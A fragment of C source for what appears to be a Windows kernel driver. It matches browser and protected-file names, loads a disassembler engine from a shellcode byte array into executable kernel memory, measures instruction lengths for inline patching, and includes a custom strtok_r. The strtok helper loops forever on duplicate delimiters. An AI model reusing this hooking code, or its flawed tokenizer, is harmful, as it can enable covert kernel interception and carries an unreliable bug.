			status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);
			g_HexConfig[g_iConfig] = (WCHAR *)kmalloc(UnicodeString2.Length + 2);
			memset(g_HexConfig[g_iConfig], 0, UnicodeString2.Length + 2);
			memcpy(g_HexConfig[g_iConfig], UnicodeString2.Buffer, UnicodeString2.Length);
			RtlFreeUnicodeString(&UnicodeString2);
			g_iConfig++;
			//kprintf("g_iConfig:%d name:%s", g_iConfig, pRetBuff);

		}
	}
}



BOOLEAN  FindInBrowser(const WCHAR *name)
{
	BOOLEAN  bRet = FALSE;
	ULONG i = 0;
	for (i = 0; i < g_iBrowser; i++)
	{

		if (_wcsicmp(g_HexBrowser[i], name) == 0)
		{
			bRet = TRUE;
			break;
		}
	}
	return bRet;
}


PMY_COMMAND_INFO  FindInProtectFile(const WCHAR *name)
{
	PMY_COMMAND_INFO pInfo = NULL;
	ULONG i = 0;
	for (i = 0; i < 2; i++)
	{

		if (_wcsicmp(g_pProtectFile[i].exename, name) == 0)
		{
			pInfo = &g_pProtectFile[i];
			break;
		}
	}
	return pInfo;
}


ULONG GetPatchSize(PUCHAR Address, int asmlen)
{
	ULONG LenCount = 0, Len = 0;

	while (LenCount <= asmlen) //
	{
		Len = LDE(Address, 64);
		//DbgPrint("LenTemp:%d\n",Len);
		Address = Address + Len;
		LenCount = LenCount + Len;

		if (asmlen == LenCount)
		{
			break;
		}
	}

	return LenCount;
}



void LDE_init()
{
	LDE = (LDE_DISASM)ExAllocatePool(NonPagedPool, 12800);
	memcpy(LDE, szShellCode, 12800);
}


ULONG GetAsmSize(PUCHAR Address, int asmlen)
{
	ULONG   dw;
	Disasm  dis;
	ULONG   DecodedLength = 0;
	int lencode = 0;
	while (DecodedLength < asmlen)
	{
		int  dw = DisasmCode((PUCHAR)((PUCHAR)Address + DecodedLength), asmlen, &dis);
		DecodedLength = DecodedLength + dw;
	}
	return DecodedLength;
}



BOOLEAN isContained(const char *str, char c)
{
	const char *p = str;
	if (str == NULL)
	{
		return FALSE;
	}

	while (*p != '\0')
	{
		if (*p == c)
		{
			return TRUE;
		}
		p++;
	}
	return FALSE;
}



//*save_ptr等价于以前的静态指针
char* myStrtok_r(char *string_org, const char *demial, char **save_ptr)
{
	char *str = NULL;         //返回的字符串
	const char *ctrl = demial; //分隔符
	//将分隔符放入map中
	char map[255] = { 0 };
	size_t len = 0;

	if (demial == NULL)
	{
		return NULL;
	}


	if (string_org == NULL && *save_ptr == NULL)
	{
		return NULL;
	}
	while (*ctrl != '\0')
	{
		if (isContained(map, *ctrl))
		{
			continue;
		}
		map[len] = *ctrl;
		len++;
		ctrl++;
	}


	if (string_org == NULL)
	{
		str = *save_ptr;
	} else
	{
		str = string_org;
	}


	//忽略掉字符串中起始部分的分隔符,找到第一个不是分隔符的字符指针
	while (*str != '\0')
	{
		if (isContained(map, *str))
		{
			str++;
			continue;
		}
		break;
	}
	string_org = str;
	//查找第一个分隔符
	while (*str)
	{
		if (isContained(map, *str))
		{
			*str++ = '\0'; //当找到时，把匹配字符填为0，并且把str指向下一位
			break;
		}
		str++;
	}
	*save_ptr = str; // 把剩余字符串的指针保存到静态变量last


	if (string_org == str)
	{
		*save_ptr = NULL;
		return NULL;
	} else
	{
		return string_org;
	}
}

/* EOF */
